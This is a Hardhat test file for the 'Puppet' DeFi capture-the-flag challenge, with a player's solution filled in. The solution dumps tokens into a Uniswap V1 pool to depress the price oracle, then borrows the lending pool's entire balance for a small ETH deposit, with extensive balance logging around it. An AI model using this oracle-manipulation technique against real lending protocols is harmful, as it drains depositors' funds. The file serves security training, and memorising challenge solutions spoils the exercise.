const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

    //*********************************************************************************************************************

        // just for ethers practice: same information is in line 18 to 23
        console.log('\n------- Check Before -----------------------\n');

        let uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
        let uniswapDVTBalance = ethers.utils.formatEther(uniswapDVTBigNumber);

        let uniswapEthBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
        let uniswapEthBalance = ethers.utils.formatEther(uniswapEthBigNumber);
        
        let attackerDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(attacker.address));
        let attackerDVTBalance = ethers.utils.formatEther(attackerDVTBigNumber);

        let attackerETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address));
        let attackerETHBalance = ethers.utils.formatEther(attackerETHBigNumber);

        let poolBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address))
        let poolBalance = ethers.utils.formatEther(poolBigNumber);''
        
        let poolETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.lendingPool.address));
        let poolETHBalance = ethers.utils.formatEther(poolETHBigNumber);

        console.log("Uniswap DVT Balance: ", uniswapDVTBalance);
        console.log("Uniswap Eth Balacne: ", uniswapEthBalance);
        console.log("Attacker DVT Balance: ", attackerDVTBalance);
        console.log("Attacker Eth Balacne: ", attackerETHBalance);
        console.log("Lending Pool DVT Balacne: ", poolBalance);
        console.log("Lending Pool ETH Balacne: ", poolETHBalance);
    
    //*********************************************************************************************************************
        
        console.log('\n------- Exploit ----------------------------\n');

        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(ATTACKER_INITIAL_TOKEN_BALANCE.div(100)), '1', deadline);

        const afterSwap_uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
        const afterSwap_uniswapDVTBalance = ethers.utils.formatEther(afterSwap_uniswapDVTBigNumber);
        const afterSwap_uniswapETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
        const afterSwap_uniswapETHBalance = ethers.utils.formatEther(afterSwap_uniswapETHBigNumber);
        
        console.log("After Swap # of DVT: ", afterSwap_uniswapDVTBalance);
        console.log("After Swap # of ETH: ", afterSwap_uniswapETHBalance);

        const sendValue = {value: ethers.utils.parseEther("24.0")}        
        const attackValue = ethers.utils.parseEther("100000")
        this.lendingPool.connect(attacker).borrow(attackValue, sendValue);

        

    //*********************************************************************************************************************
        console.log('\n------- After Exploit ----------------------\n');

         uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
         uniswapDVTBalance = ethers.utils.formatEther(uniswapDVTBigNumber);

         uniswapEthBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
         uniswapEthBalance = ethers.utils.formatEther(uniswapEthBigNumber);
        
         attackerDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(attacker.address));
         attackerDVTBalance = ethers.utils.formatEther(attackerDVTBigNumber);

         attackerETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address));
         attackerETHBalance = ethers.utils.formatEther(attackerETHBigNumber);

         poolBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address))
         poolBalance = ethers.utils.formatEther(poolBigNumber);''
        
         poolETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.lendingPool.address));
         poolETHBalance = ethers.utils.formatEther(poolETHBigNumber);

        console.log("Uniswap DVT Balance: ", uniswapDVTBalance);
        console.log("Uniswap Eth Balacne: ", uniswapEthBalance);
        console.log("Attacker DVT Balance: ", attackerDVTBalance);
        console.log("Attacker Eth Balacne: ", attackerETHBalance);
        console.log("Lending Pool DVT Balacne: ", poolBalance);
        console.log("Lending Pool ETH Balacne: ", poolETHBalance);        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});